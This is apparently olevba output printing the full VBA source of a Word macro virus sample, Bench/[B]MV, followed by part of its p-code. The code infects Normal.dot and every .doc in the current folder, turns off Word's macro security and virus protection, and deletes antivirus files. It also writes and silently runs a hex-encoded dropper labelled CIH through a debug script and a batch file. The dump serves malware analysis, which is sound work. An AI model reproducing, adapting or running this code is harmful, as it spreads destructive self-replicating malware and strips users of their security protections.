olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal
If Month(Now) = Minute(Now) Then
Randomize: For x = 1 To 10: ActiveDocument.Shapes.AddShape(msoShapeCircles, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select: Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255)): Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next x
End If
If Day(Now) = Minute(Now) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[B]MV.a"
        .Text = "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!" & vbCr & vbCr & "Click on me if you need any help!"
        .Animation = msoAnimationGreeting
        .Show
    End With
End If
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Application.Version = 9# Then ' two lines below from W2000M/PSD - I'll give VicodinES the credit for this!
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End If
If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If
If nt = 0 And ad = 0 Then GoTo darn:
If nt = 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ad))
If ad = 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, nt))
' *** Remove remarks below if you want to kill the AV proggies ***
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
' Kill "C:\program files\antiviral toolkit pro\AVP.key"
' ActiveDocument.Save
darn:
If nt <> 0 And ad = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub ' [B]MV.a Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97]
Private Sub INITALIZE_VAMP()
On Error Resume Next
Randomize
Dim r1(1 To 8) As String ' Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)
r1(1) = "VARIABLE3": r1(2) = "VARIABLE4": r1(3) = "VARIABLE5": r1(4) = "VARIABLE6": r1(5) = "VAMP": r1(6) = "INITALIZE": r1(7) = "VARIABLE2": r1(8) = "VARIABLE1"
r1(9) = "ad": r1(10) = "nt"
For x = 1 To 8 ' Change this number up to how ever many variable you add - so if you have r1(20) then this line should read x = 1 to 20
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call VAMP(a1, r1(x))
Next x
End Sub
Private Sub VAMP(VARIABLE1, VARIABLE2 As String)  'VAMP v1.0 -=[Thanks Vic!]=-
On Error Resume Next
Dim VARIABLE3 As Long: Dim VARIABLE4 As Long: Dim VARIABLE5 As Long: Dim VARIABLE6 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VARIABLE3 = 1: VARIABLE4 = 1: VARIABLE5 = .CountOfLines: VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Do While .Find(VARIABLE2, VARIABLE3, VARIABLE4, VARIABLE5, VARIABLE6, True)
s1 = .Lines(VARIABLE3, 1)
s1 = Left(s1, VARIABLE4 - 1) & VARIABLE1 & Mid(s1, VARIABLE6)
.replaceline VARIABLE3, s1
VARIABLE3 = VARIABLE5 + 1: VARIABLE4 = 1
VARIABLE5 = .CountOfLines
VARIABLE6 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO BMVf.bas 
in file: Virus.MSWord.Bench.a - OLE stream: 'Macros/VBA/BMVf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub BMVf() '[B]MV.f Module Infection - [Strain F of the [B]MV series!]
On Error Resume Next

If Application.Version = 9# Then ' two lines below from W2000M/PSD - I'll give VicodinES the credit for this!
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End If

If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If

SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal

ADInfected = False: NTInfected = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "BMVf" _
        Then
            ADInfected = True
    End If
Next I

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "BMVf" _
        Then
            NTInfected = True
            Application.Caption = "-=([B]MV.F)=-"
            Application.StatusBar = "-=([Bench] Macro Virus - Strain F)=-"
    End If
Next j

If ADInfected = False And NTInfected = False Then GoTo BMVf

If ADInfected = False Then
    NormalTemplate.VBProject.VBComponents("BMVf").Export "c:\system.sys"
    ActiveDocument.VBProject.VBComponents.Import "c:\system.sys"
    Kill "c:\system.sys"
End If

If NTInfected = False Then
    ActiveDocument.VBProject.VBComponents("BMVf").Export "c:\system.sys"
    NormalTemplate.VBProject.VBComponents.Import "c:\system.sys"
    Kill "c:\system.sys"
End If

BMVf:
If (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileSave()
On Error Resume Next
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
'kill "C:\program files\antiviral toolkit pro\avp.key"
            Application.Caption = "-=([B]MV.F])=-"
            Application.StatusBar = "-=([B]MV.F)=- / SAiNTS ViRii Dept. - Test Version"
ActiveDocument.Save
End Sub
Sub ViewVBCode()
On Error Resume Next

Call BMVf

With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus - F"
    .Text = "You're not permitted to go there! Now you're gonna pay!"
    .Animation = msoAnimationSearching
    .Show
End With

ActiveDocument.Password = "[Bench]"
ActiveDocument.Close Savechages:=wdSaveChanges

Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
' Kill "C:\program files\antiviral toolkit pro\*.*"
ActiveDocument.Save

Open "c:\TNN_CIH.SCR" For Output As #1
Print #1, "N TNN_CIH.COM"
Print #1, "E 0100 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00"
Print #1, "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
Print #1, "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
Print #1, "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
Print #1, "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F"
Print #1, "E 0160 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20"
Print #1, "E 0170 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00"
Print #1, "E 0180 50 45 00 00 4C 01 01 00 F1 68 20 35 00 00 00 00"
Print #1, "E 0190 00 00 00 00 E0 00 0F 01 0B 01 05 00 00 10 00 00"
Print #1, "E 01A0 00 00 00 00 00 00 00 00 10 10 00 00 00 10 00 00"
Print #1, "E 01B0 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"
Print #1, "E 01C0 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00"
Print #1, "E 01D0 00 20 00 00 00 02 00 00 00 00 00 00 02 00 00 00"
Print #1, "E 01E0 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00"
Print #1, "E 01F0 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0270 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00"
Print #1, "E 0280 00 10 00 00 00 10 00 00 00 10 00 00 00 02 00 00"
Print #1, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"
Print #1, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0300 C3 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00"
Print #1, "E 0310 55 8D 44 24 F8 2B DB 64 87 03 E8 00 00 00 00 5B"
Print #1, "E 0320 8D 4B 42 51 50 50 0F 01 4C 24 FE 5B 83 C3 1C FA"
Print #1, "E 0330 8B 2B 66 8B 6B FC 8D 71 12 56 66 89 73 FC C1 EE"
Print #1, "E 0340 10 66 89 73 02 5E CC 56 8B F0 8B 48 FC F3 A4 83"
Print #1, "E 0350 E8 08 8B 30 0B F6 74 02 EB F0 5E CC FB 2B DB EB"
Print #1, "E 0360 07 2B DB 64 8B 03 8B 20 64 8F 03 58 5D 68 00 10"
Print #1, "E 0370 40 00 C3 74 32 0F 21 C1 E3 10 83 04 24 15 66 89"
Print #1, "E 0380 6B FC C1 ED 10 66 89 6B 02 CF 0F 23 C3 6A 0F 51"
Print #1, "E 0390 6A FF 51 51 51 6A 01 6A 02 CD 20 53 00 01 00 83"
Print #1, "E 03A0 C4 20 97 8D 46 9D CF 8D 87 E2 FC FF FF 50 CD 20"
Print #1, "E 03B0 67 00 40 00 0F 23 C0 58 8B 4E 3D 8B 11 89 50 FC"
Print #1, "E 03C0 8D 40 D6 89 01 FA EB B6 53 E8 00 00 00 00 5B 83"
Print #1, "E 03D0 C3 24 53 CD 20 68 00 40 00 58 FF 74 24 08 FF 53"
Print #1, "E 03E0 FC 59 50 53 FF 53 FC 59 0F 23 C0 58 5B C3 00 00"
Print #1, "E 03F0 00 00 60 E8 00 00 00 00 5E 81 C6 18 03 00 00 F6"
Print #1, "E 0400 06 01 0F 85 06 02 00 00 8D 5C 24 28 83 3B 24 0F"
Print #1, "E 0410 85 F3 01 00 00 FE 06 83 C6 05 56 8A 43 04 3C FF"
Print #1, "E 0420 74 08 04 40 B4 3A 89 06 46 46 6A 00 6A 7F 8B 5B"
Print #1, "E 0430 10 8B 43 0C 83 C0 04 50 56 CD 20 41 00 40 00 83"
Print #1, "E 0440 C4 10 81 7C 06 FC 2E 45 58 45 5E 0F 85 B4 01 00"
Print #1, "E 0450 00 66 83 7B 18 01 0F 85 A9 01 00 00 66 B8 00 43"
Print #1, "E 0460 CD 20 32 00 40 00 0F 82 99 01 00 00 51 8B BE 4D"
Print #1, "E 0470 FD FF FF 8B 3F F6 C1 01 74 08 66 B8 01 43 2B C9"
Print #1, "E 0480 FF D7 2B C0 B4 D5 2B C9 2B D2 42 8B DA 43 FF D7"
Print #1, "E 0490 93 59 9C F6 C1 01 74 06 66 B8 01 43 FF D7 9D 0F"
Print #1, "E 04A0 82 60 01 00 00 56 9C 83 C6 7F 2B C0 B4 D6 8B E8"
Print #1, "E 04B0 6A 04 59 6A 3C 5A FF D7 8B 16 4A 8B C5 FF D7 81"
Print #1, "E 04C0 3E 00 50 45 00 0F 85 24 01 00 00 53 6A 00 6A 01"
Print #1, "E 04D0 52 57 0F 23 CC 50 8B C5 B1 52 83 C2 07 FF D7 8D"
Print #1, "E 04E0 42 22 50 8D 06 50 0F B7 46 0E 8D 54 10 12 B0 28"
Print #1, "E 04F0 8A 0E F6 E1 8D 76 32 50 52 56 41 51 C1 E1 03 51"
Print #1, "E 0500 03 C8 03 CA 2B 4E 1C F7 D1 41 51 91 8B 46 F0 03"
Print #1, "E 0510 46 FC 89 86 A8 FB FF FF 66 81 3C 24 B8 00 7C 7B"
Print #1, "E 0520 8B C5 FF D7 95 6A 04 59 52 8B 56 3C 83 C2 12 FF"
Print #1, "E 0530 D7 81 3E 6E 5A 69 70 74 67 5A 5B 5F 59 57 03 D5"
Print #1, "E 0540 52 03 EE 55 8D 44 3D FC 89 18 53 03 D7 52 8D BE"
Print #1, "E 0550 4A FB FF FF 57 89 56 CE 8D 56 D8 BD 00 04 00 00"
Print #1, "E 0560 EB 31 83 C2 28 8B 5A 10 2B 5A 08 76 2C 53 83 E8"
Print #1, "E 0570 08 89 18 8B 5A 14 03 5A 08 53 57 8B 5A 08 03 5A"
Print #1, "E 0580 0C 03 5E FC 89 58 04 8B 18 01 5A 08 81 4A 24 40"
Print #1, "E 0590 00 00 40 2B EB 76 0E 03 FB E2 C7 0F 21 CC EB 33"
Print #1, "E 05A0 83 C4 3C EB 4A 01 28 01 6C 24 08 2B DB 89 58 FC"
Print #1, "E 05B0 8D 86 9A FC FF FF B1 04 66 C7 00 CD 20 8B 94 8E"
Print #1, "E 05C0 62 FE FF FF 89 50 02 0F B6 94 31 61 FE FF FF 2B"
Print #1, "E 05D0 C2 E2 E5 0F 21 C8 8B 58 10 8B 38 59 E3 0D 8B F1"
Print #1, "E 05E0 B8 01 D6 00 00 5A 59 FF D7 EB F0 5B 58 F9 9C 2B"
Print #1, "E 05F0 C0 B4 D7 FF D7 9D 5E 8B DF 66 B8 03 43 8B 4E FC"
Print #1, "E 0600 8B 7E FE FF D3 FE 4E FB 61 0F 21 C0 FF 20 8B DC"
Print #1, "E 0610 FF 73 38 FF 53 24 59 89 43 1C 83 7B 28 24 75 06"
Print #1, "E 0620 8B 41 28 89 46 01 61 C3 00 3A 66 27 53 00 01 00"
Print #1, "E 0630 68 00 40 00 41 00 40 00 32 00 40 00 43 49 48 20"
Print #1, "E 0640 28 54 4E 4E 20 52 65 6D 69 78 29 20 77 72 69 74"
Print #1, "E 0650 74 65 6E 20 62 79 20 20 54 54 49 54 20 6F 66 20"
Print #1, "E 0660 54 41 54 55 4E 47 20 20 2D 2D 5B BD 5D 2D 2D 20"
Print #1, "E 0670 20 72 65 6D 69 78 65 64 20 62 79 20 56 69 63 6F"
Print #1, "E 0680 64 69 6E 45 53 20 20 2D 2D 5B BD 5D 2D 2D 20 20"
Print #1, "E 0690 54 68 65 20 4E 61 72 6B 6F 74 69 63 20 4E 65 74"
Print #1, "E 06A0 77 6F 72 6B 20 56 69 72 75 73 20 57 61 72 65 68"
Print #1, "E 06B0 6F 75 73 65 20 20 68 74 74 70 3A 2F 2F 75 73 65"
Print #1, "E 06C0 72 73 2E 73 6B 79 6E 65 74 2E 62 65 2F 73 6F 6D"
Print #1, "E 06D0 6E 75 73 2F 76 69 72 6E 6E 76 77 2E 68 74 6D 6C"
Print #1, "E 06E0 20 20 2D 2D 5B BD 5D 2D 2D 20 20 A9 56 69 63 92"
Print #1, "E 06F0 73 20 4E 6F 74 20 57 6F 72 6B 69 6E 92 20 57 69"
Print #1, "E 0700 74 68 20 41 20 46 75 6C 6C 20 44 65 63 6B 21 20"
Print #1, "E 0710 00"
Print #1, "RCX"
Print #1, "611"
Print #1, "W"
Print #1, "Q"
Close #1

Open "c:\Startv.bat" For Output Access Write As #1
Print #2, "@echo off"
Print #2, "c:\"
Print #2, "debug < TNN_CIH.scr > nul"
Print #2, "del TNN_CIH.scr"
Print #2, "ren TNN_CIH.Com TNN_CIH.EXE"
Print #2, "TNN_CIH.Exe"
Print #2, "del startv.bat"
Close #2
Shell ("c:\startv.bat"), vbHide

With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[B]MV.f"
    .Text = "I have just attempted to install the CIH virus on your system." & vbCr & "I just felt like warning you..."
    .Animation = msoAnimationGetAttentionMajor
    .Show
End With
    
End Sub
Sub AutoExit()
    On Error Resume Next
    Call BMVf
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call BMVf
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call BMVf
End If
Loop
Application.Quit
End Sub
Sub FileExit()
    On Error Resume Next
    Call BMVf
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call BMVf
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call BMVf
End If
Loop
Application.Quit
End Sub
Sub FileTemplates()
On Error Resume Next
Call BMVf
End Sub
Sub ToolsMacro()
On Error Resume Next
Call BMVf
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bench.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9791 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0036 "c:\program files\microsoft office\templates\normal.dot"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #3:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoShapeCircles 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' 	BoS 0x0000 
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #8:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #9:
' 	LitStr 0x0007 "[B]MV.a"
' 	MemStWith Heading 
' Line #10:
' 	LitStr 0x0059 "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "Click on me if you need any help!"
' 	Concat 
' 	MemStWith Then 
' Line #11:
' 	Ld msoAnimationGreeting 
' 	MemStWith Animation 
' Line #12:
' 	ArgsMemCallWith Show 0x0000 
' Line #13:
' 	EndWith 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #16:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0021 0x004B " two lines below from W2000M/PSD - I'll give VicodinES the credit for this!"
' Line #17:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #18:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4020 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo darn 
' 	BoS 0x0000 
' 	EndIf 
' Line #25:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Sub AutoClose"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld ad 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Sub AutoOpen"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld nt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0041 " *** Remove remarks below if you want to kill the AV proggies ***"
' Line #28:
' 	LitStr 0x002E "c:\program files\norton antivirus\Virscan2.dat"
' 	ArgsCall Kill 0x0001 
' Line #29:
' 	LitStr 0x000B "c:\vdoc\*.*"
' 	ArgsCall Kill 0x0001 
' Line #30:
' 	LitStr 0x000D "c:\f-prot\*.*"
' 	ArgsCall Kill 0x0001 
' Line #31:
' 	QuoteRem 0x0000 0x0036 " Kill "C:\program files\antiviral toolkit pro\AVP.key""
' Line #32:
' 	QuoteRem 0x0000 0x0014 " ActiveDocument.Save"
' Line #33:
' 	Label darn 
' Line #34:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #35:
' 	EndSub 
' 	QuoteRem 0x0008 0x0067 " [B]MV.a Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97]"
' Line #36:
' 	FuncDefn (Private Sub INITALIZE_VAMP())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall Read 0x0000 
' Line #39:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	VarDefn r1 (As String)
' 	QuoteRem 0x0019 0x0072 " Update the array for however many variable you add - so if you have r1(20) then this line should read r1(1 to 20)"
' Line #40:
' 	LitStr 0x0009 "VARIABLE3"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE4"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE5"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "VARIABLE6"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "VAMP"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "INITALIZE"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
